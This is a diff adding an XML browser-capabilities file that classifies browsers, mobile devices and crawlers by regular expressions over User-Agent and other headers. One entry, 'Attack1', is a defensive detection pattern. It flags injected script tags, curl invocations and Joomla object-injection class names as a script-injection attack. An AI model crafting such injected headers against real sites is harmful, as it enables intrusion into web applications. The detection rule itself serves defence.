@@ -1,0 +1,2539 @@
+<Browser Id="799" ParentId="" Prority="" Name="Default">
+  <Capability Name="browser" Value="Unknown" />
+  <Capability Name="crawler" Value="False" />
+  <Capability Name="mobileDeviceManufacturer" Value="Unknown" />
+  <Capability Name="mobileDeviceModel" Value="Unknown" />
+  <Capability Name="platform" Value="Unknown" />
+  <Capability Name="version" Value="0.0" />
+  <Capability Name="isMobileDevice" Value="False" />
+  <Child Id="828" Name="AppEngineGoogle" Type="Browser" />
+  <Child Id="819" Name="Attack1" Type="Browser" />
+  <Child Id="806" Name="AvantGo" Type="Browser" />
+  <Child Id="829" Name="BlackHole" Type="GateWay" />
+  <Child Id="825" Name="CFNetwork" Type="Browser" />
+  <Child Id="814" Name="Chromium_IRON" Type="Browser" />
+  <Child Id="1136" Name="Dalvik" Type="Browser" />
+  <Child Id="812" Name="Docomo" Type="Browser" />
+  <Child Id="815" Name="ELinks" Type="Browser" />
+  <Child Id="824" Name="FeedfetcherGoogle" Type="Browser" />
+  <Child Id="823" Name="GoogleSitemaps" Type="Browser" />
+  <Child Id="822" Name="GooglebotMediapartners" Type="Browser" />
+  <Child Id="1165" Name="Konqueror" Type="Browser" />
+  <Child Id="816" Name="Links" Type="Browser" />
+  <Child Id="817" Name="Lynx" Type="Browser" />
+  <Child Id="800" Name="Malformed2" Type="Browser" />
+  <Child Id="809" Name="Midori" Type="Browser" />
+  <Child Id="813" Name="Mozilla" Type="Browser" />
+  <Child Id="808" Name="NetFront" Type="Browser" />
+  <Child Id="811" Name="NovarraVision" Type="Browser" />
+  <Child Id="1065" Name="OceanOS" Type="GateWay" />
+  <Child Id="1158" Name="Platform" Type="GateWay" />
+  <Child Id="1173" Name="Spam" Type="Browser" />
+  <Child Id="827" Name="TelligentCommon" Type="Browser" />
+  <Child Id="826" Name="TelligentComponents" Type="Browser" />
+  <Child Id="807" Name="WebTV" Type="Browser" />
+  <Child Id="803" Name="aCrawler" Type="GateWay" />
+  <Child Id="801" Name="aMobile1" Type="GateWay" />
+  <Child Id="802" Name="aMobile2" Type="GateWay" />
+  <Child Id="805" Name="aOpera" Type="Browser" />
+  <Child Id="804" Name="bCrawler" Type="GateWay" />
+  <Child Id="1133" Name="certifytheweb.com" Type="Browser" />
+  <Child Id="810" Name="iCab" Type="Browser" />
+  <Child Id="1151" Name="lkxscan" Type="Browser" />
+  <Child Id="820" Name="xCrawler1" Type="Browser" />
+  <Child Id="821" Name="xCrawler2" Type="Browser" />
+  <Child Id="818" Name="xMobile1" Type="Browser" />
+</Browser>
+<Browser Id="800" ParentId="799" Prority="" Name="Malformed2">
+  <Identification Type="Header" Name="User-Agent" Match="^Http_User_Agent|^User\-Agent|^Agent:\s|#\sUA\s|^&quot;Mozilla|^'Mozilla|^--user-agent=|^=Mozilla" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="browser" Value="Malformed User-Agent" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Gateway Id="801" ParentId="799" Prority="" Name="aMobile1">
+  <Identification Type="Header" Name="User-Agent" Match="Windows\sCE|PalmSource|PalmOS|MIDP-[12]\.[0-9]|portalmmm|Symbian\sOS|UP\.Browser|MobilePhone|Nokia|DoCoMo" />
+  <Capability Name="isMobileDevice" Value="True" />
+  <Child Id="830" Name="aMobile1SAMSUNG" Type="Browser" />
+</Gateway>
+<Gateway Id="802" ParentId="799" Prority="" Name="aMobile2">
+  <Identification Type="capability" Name="isMobileDevice" Match="True" />
+  <Identification Type="Header" Name="x-wap-profile" Match="http://(?'profileHostName'[^/]*)/" />
+  <Capability Name="profileHostName" Value="${profileHostName}" />
+  <Child Id="842" Name="aMobile2ASUSTeK" Type="Browser" />
+  <Child Id="838" Name="aMobile2Blackberry" Type="Browser" />
+  <Child Id="839" Name="aMobile2HTCMMS" Type="Browser" />
+  <Child Id="834" Name="aMobile2Handango" Type="Browser" />
+  <Child Id="835" Name="aMobile2Nokia" Type="Browser" />
+  <Child Id="832" Name="aMobile2Palm" Type="Browser" />
+  <Child Id="833" Name="aMobile2Sagem" Type="Browser" />
+  <Child Id="836" Name="aMobile2Samsung" Type="Browser" />
+  <Child Id="837" Name="aMobile2SonyEricsson" Type="Browser" />
+  <Child Id="831" Name="aMobile2SprintPCS" Type="Browser" />
+  <Child Id="840" Name="aMobile2metropcs" Type="Browser" />
+  <Child Id="841" Name="aMobilealltel" Type="Browser" />
+</Gateway>
+<Gateway Id="803" ParentId="799" Prority="1" Name="aCrawler">
+  <Identification Type="Header" Name="User-Agent" Match="(?i-s:crawler|bot|spider|larbin|search|indexer|archiver|heritrix|HttpClient|Nutch|libwww|Ask\sJeeves|thumbnails|CerberianDrtrs|Cerberian Drtrs|Bluecoat\sDRTR|Slurp|HTTrack|Indy\sLibrary|picmole|research\sproject|WebCapture|ScanAlert|Xenu|Sleuth|Mozlila|\[WEBKIT_VERSION\]|\[CHROME_VERSION\])" />
+  <Identification Type="Header" Name="User-Agent" NonMatch="FunWebProducts|Alcohol\sSearch|Searchbar|Desktop\sSearch|MyPC\sSearch|SEARCHALOT|Rabio\sSearch\sEnhancer|ThrashersSearch" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="isMobileDevice" Value="False" />
+</Gateway>
+<Gateway Id="804" ParentId="799" Prority="" Name="bCrawler">
+  <Identification Type="Header" Name="From" Match="([a-zA-Z0-9_\-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="isMobileDevice" Value="False" />
+</Gateway>
+<Browser Id="805" ParentId="799" Prority="" Name="aOpera">
+  <Samples Name="User-Agent" Value="Opera/9.80 (Windows NT 5.1; U; en) Presto/2.5.22 Version/10.51" />
+  <Identification Type="Header" Name="User-Agent" Match="Opera(/|\s)(?'version'\d+\.\d+(\.\d+)?)" />
+  <Identification Type="capability" Name="crawler" Match="False" />
+  <Capture Type="Header" Name="User-Agent" Match="(?'layoutEngine'Presto)/(?'layoutEngineVersion'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Opera" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="layoutEngineVersion" Value="${layoutEngineVersion}" />
+  <Capability Name="layoutEngine" Value="${layoutEngine}" />
+  <Child Id="845" Name="Opera10" Type="Browser" />
+  <Child Id="843" Name="OperaMini" Type="Browser" />
+  <Child Id="844" Name="OperaMiniphone2" Type="Browser" />
+</Browser>
+<Browser Id="806" ParentId="799" Prority="" Name="AvantGo">
+  <Identification Type="Header" Name="User-Agent" Match="AvantGo .*" />
+  <Capture Type="Header" Name="X-AvantGo-Version" Match="(?'version'(?'major'\d+)\.(?'minor'\d+).*)" />
+  <Capture Type="Header" Name="User-Agent" Match="AvantGo (?'version'(?'major'\d+)\.(?'minor'\d+(\.\d+)?))" />
+  <Capability Name="browser" Value="AvantGo" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="isMobileDevice" Value="True" />
+  <Capability Name="mobileDeviceManufacturer" Value="T-Mobile" />
+  <Capability Name="mobileDeviceModel" Value="SideKick" />
+</Browser>
+<Browser Id="807" ParentId="799" Prority="" Name="WebTV">
+  <Identification Type="Header" Name="User-Agent" Match="WebTV/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="WebTV" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="isMobileDevice" Value="True" />
+</Browser>
+<Browser Id="808" ParentId="799" Prority="" Name="NetFront">
+  <Identification Type="Header" Name="User-Agent" Match="NetFront/(?'versionString'(?'browserMajorVersion'\d+)\.(?'browserMinorVersion'\d+(\.\d+)?))" />
+  <Capture Type="Header" Name="User-Agent" Match="MobilePhone (?'deviceModel'[^/]*)" />
+  <Capture Type="Header" Name="User-Agent" Match="PDA; (?'deviceModel'[^/]*)" />
+  <Capture Type="Header" Name="User-Agent" Match="DTV;(?'deviceModel'[^/]*)" />
+  <Capability Name="browser" Value="Compact NetFront" />
+  <Capability Name="mobileDeviceModel" Value="${deviceModel}" />
+  <Capability Name="version" Value="${versionString}" />
+  <Child Id="846" Name="NetFrontSonyEricsson" Type="Browser" />
+</Browser>
+<Browser Id="809" ParentId="799" Prority="" Name="Midori">
+  <Identification Type="Header" Name="User-Agent" Match="^Midori/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Midori" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="810" ParentId="799" Prority="" Name="iCab">
+  <Identification Type="Header" Name="User-Agent" Match="^iCab/(?'version'\d+\.\d+(\.\d+)?)\sSafari" />
+  <Capability Name="browser" Value="iCab" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="811" ParentId="799" Prority="" Name="NovarraVision">
+  <Identification Type="Header" Name="User-Agent" Match="Novarra\-Vision\s(?'version'\d+\.\d+(\.\d+)?)|Novarra\-Vision/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capture Type="Header" Name="User-Agent" Match="^(?'deviceID'[^/]*)/" />
+  <Capability Name="browser" Value="Novarra-Vision" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="mobileDeviceModel" Value="${deviceID}" />
+</Browser>
+<Browser Id="812" ParentId="799" Prority="" Name="Docomo">
+  <Identification Type="Header" Name="User-Agent" Match="^DoCoMo/" />
+  <Identification Type="capability" Name="isMobileDevice" Match="True" />
+  <Identification Type="capability" Name="crawler" Match="False" />
+  <Capture Type="Header" Name="User-Agent" Match="^DoCoMo/(?'version'(?'major'\d+)\.(?'minor'\d+(\.\d+)?))[/ ](?'deviceID'[^/\x28]*)" />
+  <Capability Name="browser" Value="i-mode" />
+  <Capability Name="mobileDeviceModel" Value="${deviceID}" />
+  <Capability Name="isMobileDevice" Value="True" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="813" ParentId="799" Prority="" Name="Mozilla">
+  <Identification Type="Header" Name="User-Agent" Match="^Mozilla/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Identification Type="Header" Name="User-Agent" NonMatch="BlackBerry" />
+  <Identification Type="capability" Name="crawler" Match="False" />
+  <Capability Name="browser" Value="Netscape" />
+  <Capability Name="version" Value="${version}" />
+  <Child Id="851" Name="AppleWebKit" Type="Browser" />
+  <Child Id="1160" Name="Blink" Type="GateWay" />
+  <Child Id="870" Name="FeedfetcherGoogle2" Type="Browser" />
+  <Child Id="848" Name="Gecko" Type="Browser" />
+  <Child Id="871" Name="IEMobile2" Type="Browser" />
+  <Child Id="1163" Name="KHTML" Type="Browser" />
+  <Child Id="866" Name="MacMSWord" Type="Browser" />
+  <Child Id="867" Name="Malformed5" Type="Browser" />
+  <Child Id="868" Name="Malformed7" Type="Browser" />
+  <Child Id="869" Name="Malformed8" Type="Browser" />
+  <Child Id="861" Name="Mozilla2CompatibleA" Type="Browser" />
+  <Child Id="862" Name="Mozilla2CompatibleB" Type="Browser" />
+  <Child Id="858" Name="Mozilla3CompatibleA" Type="Browser" />
+  <Child Id="859" Name="Mozilla3CompatibleB" Type="Browser" />
+  <Child Id="860" Name="Mozilla3CompatibleC" Type="Browser" />
+  <Child Id="855" Name="Mozilla4CompatibleA" Type="Browser" />
+  <Child Id="856" Name="Mozilla4CompatibleB" Type="Browser" />
+  <Child Id="857" Name="Mozilla4CompatibleC" Type="Browser" />
+  <Child Id="852" Name="Mozilla5CompatibleA" Type="Browser" />
+  <Child Id="853" Name="Mozilla5CompatibleB" Type="Browser" />
+  <Child Id="854" Name="Mozilla5CompatibleC" Type="Browser" />
+  <Child Id="850" Name="MozillaGaleon" Type="Browser" />
+  <Child Id="847" Name="NonGecko" Type="Browser" />
+  <Child Id="1170" Name="Opera Mozilla" Type="Browser" />
+  <Child Id="863" Name="Planetweb" Type="Browser" />
+  <Child Id="865" Name="PlayStation3" Type="Browser" />
+  <Child Id="864" Name="PlayStationPortable" Type="Browser" />
+  <Child Id="849" Name="SpoofGecko" Type="Browser" />
+  <Child Id="1159" Name="Trident" Type="GateWay" />
+</Browser>
+<Browser Id="814" ParentId="799" Prority="" Name="Chromium_IRON">
+  <Identification Type="Header" Name="User-Agent" Match="Iron/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Iron" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="815" ParentId="799" Prority="" Name="ELinks">
+  <Identification Type="Header" Name="User-Agent" Match="^ELinks\s\((?'version'\d+\.\d+\.\d+)|^ELinks/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="ELinks" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="816" ParentId="799" Prority="" Name="Links">
+  <Identification Type="Header" Name="User-Agent" Match="^Links\s\((?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Links" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="crawler" Value="False" />
+  <Capability Name="isMobileDevice" Value="False" />
+</Browser>
+<Browser Id="817" ParentId="799" Prority="" Name="Lynx">
+  <Identification Type="Header" Name="User-Agent" Match="^Lynx/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Lynx" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="crawler" Value="False" />
+  <Capability Name="isMobileDevice" Value="False" />
+</Browser>
+<Browser Id="818" ParentId="799" Prority="" Name="xMobile1">
+  <Identification Type="capability" Name="isMobileDevice" Match="True" />
+  <Child Id="877" Name="Ericsson" Type="Browser" />
+  <Child Id="872" Name="Nokia" Type="Browser" />
+  <Child Id="874" Name="OceanBlackBerry" Type="Browser" />
+  <Child Id="875" Name="OceanMIB" Type="Browser" />
+  <Child Id="879" Name="POCKETIE" Type="Browser" />
+  <Child Id="878" Name="SAMSUNGAUMIC" Type="Browser" />
+  <Child Id="873" Name="UPBrowser" Type="Browser" />
+  <Child Id="876" Name="portalmmm" Type="Browser" />
+  <Child Id="880" Name="xIEMobile" Type="Browser" />
+</Browser>
+<Browser Id="819" ParentId="799" Prority="" Name="Attack1">
+  <Identification Type="Header" Name="User-Agent" Match="&lt;SCRIPT&gt;|'curl|\(curl|JDatabaseDriverMysqli|JSimplepieFactory" />
+  <Capability Name="browser" Value="Script Injection Attack" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="OS" Value="Unknown" />
+</Browser>
+<Browser Id="820" ParentId="799" Prority="" Name="xCrawler1">
+  <Identification Type="capability" Name="crawler" Match="True" />
+  <Capture Type="Header" Name="User-Agent" Match="^(?'browser'[^\s|^/]*)[\s/](?'version'\d+\.\d+(\.\d+)?\w*)" />
+  <Capability Name="browser" Value="${browser}" />
+  <Capability Name="version" Value="${version}" />
+  <Child Id="883" Name="OceanSpiders" Type="Browser" />
+  <Child Id="881" Name="SpoofMSIE2" Type="Browser" />
+  <Child Id="1152" Name="Xenu Link Sleuth" Type="Browser" />
+  <Child Id="882" Name="XenuLinkSleuth_OLD" Type="Browser" />
+</Browser>
+<Browser Id="821" ParentId="799" Prority="" Name="xCrawler2">
+  <Identification Type="capability" Name="crawler" Match="False" />
+  <Identification Type="capability" Name="isMobileDevice" Match="False" />
+  <Identification Type="Header" Name="User-Agent" Match="^(?'browser'[^\s|^/]*)[\s/](?'version'\d+\.\d+(\.\d+)?\w*)" />
+  <Capability Name="browser" Value="${browser}" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="OS" Value="Unknown" />
+  <Capability Name="mobileDeviceManufacturer" Value="Unknown" />
+  <Capability Name="mobileDeviceModel" Value="Unknown" />
+  <Child Id="884" Name="Curl" Type="Browser" />
+  <Child Id="887" Name="DefaultJava" Type="Browser" />
+  <Child Id="889" Name="LWPSimple" Type="Browser" />
+  <Child Id="896" Name="Malformed10" Type="Browser" />
+  <Child Id="890" Name="Malformed3" Type="Browser" />
+  <Child Id="886" Name="MicrosoftURLControl" Type="Browser" />
+  <Child Id="895" Name="PHPBrowserCapabilitiesProject" Type="Browser" />
+  <Child Id="885" Name="Pythonurllib" Type="Browser" />
+  <Child Id="893" Name="Wget" Type="Browser" />
+  <Child Id="894" Name="WordPress" Type="Browser" />
+  <Child Id="891" Name="XenuLinkSleuth" Type="Browser" />
+  <Child Id="888" Name="findlinks" Type="Browser" />
+  <Child Id="892" Name="webcollage" Type="Browser" />
+</Browser>
+<Browser Id="822" ParentId="799" Prority="" Name="GooglebotMediapartners">
+  <Identification Type="Header" Name="User-Agent" Match="^Mediapartners-Google/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Mediapartners-Google" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="crawler" Value="True" />
+</Browser>
+<Browser Id="823" ParentId="799" Prority="" Name="GoogleSitemaps">
+  <Identification Type="Header" Name="User-Agent" Match="^Google-Sitemaps/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Google-Sitemaps" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="crawler" Value="True" />
+</Browser>
+<Browser Id="824" ParentId="799" Prority="" Name="FeedfetcherGoogle">
+  <Identification Type="Header" Name="User-Agent" Match="Feedfetcher-Google" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="browser" Value="Feedfetcher-Google" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="825" ParentId="799" Prority="" Name="CFNetwork">
+  <Identification Type="Header" Name="User-Agent" Match="CFNetwork/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="CFNetwork" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="crawler" Value="True" />
+</Browser>
+<Browser Id="826" ParentId="799" Prority="" Name="TelligentComponents">
+  <Identification Type="Header" Name="User-Agent" Match="Telligent\.Components" />
+  <Capability Name="browser" Value="Telligent Components" />
+  <Capability Name="version" Value="0.0" />
+  <Capability Name="crawler" Value="True" />
+</Browser>
+<Browser Id="827" ParentId="799" Prority="" Name="TelligentCommon">
+  <Identification Type="Header" Name="User-Agent" Match="Telligent.Common" />
+  <Capability Name="browser" Value="Telligent Common" />
+  <Capability Name="version" Value="0.0" />
+  <Capability Name="crawler" Value="True" />
+</Browser>
+<Browser Id="828" ParentId="799" Prority="" Name="AppEngineGoogle">
+  <Identification Type="Header" Name="User-Agent" Match="AppEngine-Google" />
+  <Capability Name="browser" Value="AppEngine-Google" />
+  <Capability Name="version" Value="0.0" />
+  <Capability Name="crawler" Value="True" />
+</Browser>
+<Gateway Id="829" ParentId="799" Prority="1" Name="BlackHole">
+  <Identification Type="Header" Name="User-Agent" Match="." />
+  <Capture Type="Header" Name="User-Agent" Match="^(?'browser'^.*)\s-\s(?'version'(?'major'\d+)\.(?'minor'\d+(\.\d+)?))" />
+  <Capture Type="Header" Name="User-Agent" Match="^(?!Mozilla)^(?'browser'[^\s|^/]*)[\s/\-](?'version'(?'major'\d+)\.(?'minor'\d+(\.\d+)?))" />
+  <Capture Type="Header" Name="User-Agent" Match="(?'browser'[^/]*)/(?'version'(?'major'\d+)\.(?'minor'\d+(\.\d+)?))|(?'browser'^.*)[ /](?'version'(?'major'\d+)\.(?'minor'\d+(\.\d+)?))" />
+  <Capability Name="browser" Value="Generic Browser" />
+  <Capability Name="version" Value="0.0" />
+  <Capability Name="browser" Value="${browser}" />
+  <Capability Name="version" Value="${version}" />
+</Gateway>
+<Browser Id="830" ParentId="801" Prority="" Name="aMobile1SAMSUNG">
+  <Identification Type="Header" Name="User-Agent" Match="((?i:Samsung)|SEC|SGH|SCH)-(?'Model'[^/|^\s]*)" />
+  <Capability Name="mobileDeviceManufacturer" Value="Samsung" />
+  <Capability Name="mobileDeviceModel" Value="${Model}" />
+</Browser>
+<Browser Id="831" ParentId="802" Prority="" Name="aMobile2SprintPCS">
+  <Identification Type="capability" Name="profileHostName" Match="device\.sprintpcs\.com" />
+  <Child Id="898" Name="SamsungLX550V09" Type="Browser" />
+  <Child Id="899" Name="SamsungMM7400" Type="Browser" />
+  <Child Id="900" Name="SamsungSPHM560" Type="Browser" />
+</Browser>
+<Browser Id="832" ParentId="802" Prority="" Name="aMobile2Palm">
+  <Identification Type="capability" Name="profileHostName" Match="downloads\.palm\.com|downloads\.palmone\.com" />
+  <Capability Name="mobileDeviceManufacturer" Value="Palm" />
+</Browser>
+<Browser Id="833" ParentId="802" Prority="" Name="aMobile2Sagem">
+  <Identification Type="capability" Name="profileHostName" Match="extranet\.sagem\.com" />
+  <Capability Name="mobileDeviceManufacturer" Value="Sagem" />
+</Browser>
+<Browser Id="834" ParentId="802" Prority="" Name="aMobile2Handango">
+  <Identification Type="capability" Name="profileHostName" Match="motorola\.handango\.com" />
+  <Capability Name="mobileDeviceManufacturer" Value="Motorola" />
+</Browser>
+<Browser Id="835" ParentId="802" Prority="" Name="aMobile2Nokia">
+  <Identification Type="capability" Name="profileHostName" Match="nokia\.com" />
+  <Capability Name="mobileDeviceManufacturer" Value="Nokia" />
+</Browser>
+<Browser Id="836" ParentId="802" Prority="" Name="aMobile2Samsung">
+  <Identification Type="capability" Name="profileHostName" Match="samsungmobile\.com" />
+  <Capability Name="mobileDeviceManufacturer" Value="Samsung" />
+  <Child Id="901" Name="SamsungZ107UAProf" Type="Browser" />
+  <Child Id="902" Name="SamsungZ140VUAProf" Type="Browser" />
+</Browser>
+<Browser Id="837" ParentId="802" Prority="" Name="aMobile2SonyEricsson">
+  <Identification Type="capability" Name="profileHostName" Match="sonyericsson\.com" />
+  <Capability Name="mobileDeviceManufacturer" Value="Ericsson" />
+  <Child Id="903" Name="aMobile2SonyEricssondeviceID" Type="Browser" />
+</Browser>
+<Browser Id="838" ParentId="802" Prority="" Name="aMobile2Blackberry">
+  <Identification Type="capability" Name="profileHostName" Match="blackberry\.net" />
+  <Capability Name="mobileDeviceManufacturer" Value="RIM" />
+</Browser>
+<Browser Id="839" ParentId="802" Prority="" Name="aMobile2HTCMMS">
+  <Identification Type="capability" Name="profileHostName" Match="htcmms\.com\.tw" />
+  <Capability Name="mobileDeviceManufacturer" Value="High Tech Computer Corporation" />
+</Browser>
+<Browser Id="840" ParentId="802" Prority="" Name="aMobile2metropcs">
+  <Identification Type="capability" Name="profileHostName" Match="uaprof\.metropcs\.net" />
+  <Child Id="904" Name="SamsungSCHR56" Type="Browser" />
+</Browser>
+<Browser Id="841" ParentId="802" Prority="" Name="aMobilealltel">
+  <Identification Type="capability" Name="profileHostName" Match="www\.alltel\.net" />
+  <Capability Name="mobileDeviceManufacturer" Value="alltel" />
+</Browser>
+<Browser Id="842" ParentId="802" Prority="" Name="aMobile2ASUSTeK">
+  <Identification Type="capability" Name="profileHostName" Match="uaprofile\.asus\.com" />
+  <Capability Name="mobileDeviceManufacturer" Value="ASUSTeK Computer Inc" />
+</Browser>
+<Browser Id="843" ParentId="805" Prority="" Name="OperaMini">
+  <Identification Type="Header" Name="User-Agent" Match="Opera\sMini[ /](?'version'\d+\.\d+(\.\d+)?)" />
+  <Capture Type="Header" Name="x-operamini-phone" Match="(?'Manufacturer'.+)\s\#\s(?'deviceID'.+)" />
+  <Capability Name="isMobileDevice" Value="true" />
+  <Capability Name="browser" Value="Opera Mini" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="mobileDeviceManufacturer" Value="${Manufacturer}" />
+  <Capability Name="mobileDeviceModel" Value="${deviceID}" />
+  <Child Id="905" Name="OperaMiniphone1" Type="Browser" />
+  <Child Id="906" Name="OperaMiniphone3" Type="Browser" />
+</Browser>
+<Browser Id="844" ParentId="805" Prority="" Name="OperaMiniphone2">
+  <Identification Type="Header" Name="x-operamini-phone" Match="(?'Manufacturer'.+)\s\#\s(?'deviceID'.+)" />
+  <Capability Name="browser" Value="Opera Mini" />
+  <Capability Name="version" Value="0.0" />
+  <Capability Name="mobileDeviceManufacturer" Value="${Manufacturer}" />
+  <Capability Name="mobileDeviceModel" Value="${deviceID}" />
+  <Capability Name="isMobileDevice" Value="True" />
+</Browser>
+<Browser Id="845" ParentId="805" Prority="" Name="Opera10">
+  <Identification Type="capability" Name="majorversion" Match="^[8-9]$" />
+  <Identification Type="Header" Name="User-Agent" Match="Version/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Opera" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="846" ParentId="808" Prority="" Name="NetFrontSonyEricsson">
+  <Identification Type="Header" Name="User-Agent" Match="SonyEricsson(?'deviceModel'[^/]*)" />
+  <Capability Name="mobileDeviceModel" Value="${deviceModel}" />
+  <Capability Name="MobileDeviceManufacturer" Value="Sony Ericsson" />
+</Browser>
+<Browser Id="847" ParentId="813" Prority="" Name="NonGecko">
+  <Identification Type="Header" Name="User-Agent" Match="^Mozilla/5\.0\s" />
+  <Identification Type="Header" Name="User-Agent" NonMatch="^Mozilla/5\.0\s\(compatible;\s" />
+  <Identification Type="Header" Name="User-Agent" NonMatch="Gecko/\d{2,3}\.\d" />
+  <Identification Type="Header" Name="User-Agent" NonMatch="Gecko/\d{8,10}" />
+  <Identification Type="Header" Name="User-Agent" Match="rv\:(?'version'\d+\.\d+(\.\d+)?)" />
+  <Identification Type="capability" Name="browser" Match="Netscape" />
+  <Capability Name="browser" Value="Mozilla" />
+  <Capability Name="version" Value="${version}" />
+  <Child Id="907" Name="IE_VersionX" Type="Browser" />
+  <Child Id="1171" Name="Opera nonGecko" Type="Browser" />
+</Browser>
+<Browser Id="848" ParentId="813" Prority="" Name="Gecko">
+  <Identification Type="Header" Name="User-Agent" Match="^Mozilla/5\.0\s" />
+  <Identification Type="Header" Name="User-Agent" Match="Gecko/\d{8,10}|Gecko/\d{2,3}\.\d" />
+  <Identification Type="Header" Name="User-Agent" NonMatch="^Mozilla/5\.0\s\(compatible;\s" />
+  <Capture Type="Header" Name="User-Agent" Match="rv\:(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Mozilla" />
+  <Capability Name="version" Value="${version}" />
+  <Child Id="909" Name="GeckoBasic" Type="Browser" />
+  <Child Id="910" Name="GeckoNetscape6" Type="Browser" />
+  <Child Id="908" Name="MozillaFireFoxA" Type="Browser" />
+</Browser>
+<Browser Id="849" ParentId="813" Prority="" Name="SpoofGecko">
+  <Identification Type="Header" Name="User-Agent" NonMatch="^Mozilla/5\.0\s" />
+  <Identification Type="Header" Name="User-Agent" Match="Gecko/\d{8,10}" />
+  <Capability Name="browser" Value="Spoof Mozilla" />
+  <Child Id="911" Name="SpoofGeckoBasic" Type="Browser" />
+</Browser>
+<Browser Id="850" ParentId="813" Prority="" Name="MozillaGaleon">
+  <Identification Type="Header" Name="User-Agent" Match="^Mozilla/5\.0\sGaleon/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Galeon" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="851" ParentId="813" Prority="" Name="AppleWebKit">
+  <Identification Type="Header" Name="User-Agent" Match="^Mozilla/5\.0\s" />
+  <Identification Type="Header" Name="User-Agent" Match=" AppleWebKit/(?'appleWebTechnologyVersion'(\d+(\.\d+(\.\d+)?)?))" />
+  <Capability Name="appleWebTechnologyVersion" Value="${appleWebTechnologyVersion}" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+  <Capability Name="layoutEngineVersion" Value="${appleWebTechnologyVersion}" />
+  <Child Id="912" Name="Android" Type="Browser" />
+  <Child Id="913" Name="AppleWebKitBasic2" Type="Browser" />
+  <Child Id="914" Name="AppleWebKitBasic3" Type="Browser" />
+  <Child Id="917" Name="AppleWebKitChrome" Type="Browser" />
+  <Child Id="915" Name="AppleWebKitSymbianOS" Type="Browser" />
+  <Child Id="918" Name="Arora" Type="Browser" />
+  <Child Id="1128" Name="CriOS Desktop" Type="Browser" />
+  <Child Id="1162" Name="EdgiOS" Type="Browser" />
+  <Child Id="1156" Name="Mozilla5CompatibleA1" Type="GateWay" />
+  <Child Id="916" Name="OmniWebAppleWebKit" Type="Browser" />
+  <Child Id="1167" Name="PlayBook" Type="Browser" />
+  <Child Id="919" Name="SafariFaceBook" Type="Browser" />
+</Browser>
+<Browser Id="852" ParentId="813" Prority="" Name="Mozilla5CompatibleA">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (compatible; Konqueror/4.5; Windows) KHTML/4.5.4 (like Gecko)" />
+  <Identification Type="Header" Name="User-Agent" Match="^Mozilla/5\.0\s\(compatible;\s(?'Browser'[^/\d;\)]*)/(?'version'\d+\.\d+(\.\d+)?)([^;]*)?;" />
+  <Capability Name="browser" Value="${Browser}" />
+  <Capability Name="version" Value="${version}" />
+  <Child Id="920" Name="LegalAnalysisAgent" Type="Browser" />
+  <Child Id="922" Name="NetcraftSurveyAgent" Type="Browser" />
+  <Child Id="923" Name="SiteExplorer" Type="Browser" />
+  <Child Id="921" Name="WebMasterAid" Type="Browser" />
+</Browser>
+<Browser Id="853" ParentId="813" Prority="" Name="Mozilla5CompatibleB">
+  <Identification Type="Header" Name="User-Agent" Match="^Mozilla/5\.0\s\(compatible;\s(?'Browser'[^\s]*)\s(?'version'\d+\.\d+([^;]*)?);" />
+  <Capability Name="browser" Value="${Browser}" />
+  <Capability Name="version" Value="${version}" />
+  <Child Id="926" Name="Mozilla X Malformed4" Type="Browser" />
+  <Child Id="1145" Name="Mozilla_Trident4" Type="Browser" />
+  <Child Id="924" Name="Mozilla_Trident5" Type="Browser" />
+  <Child Id="925" Name="Mozilla_Trident6" Type="Browser" />
+  <Child Id="1144" Name="Mozilla_Trident7" Type="Browser" />
+</Browser>
+<Browser Id="854" ParentId="813" Prority="" Name="Mozilla5CompatibleC">
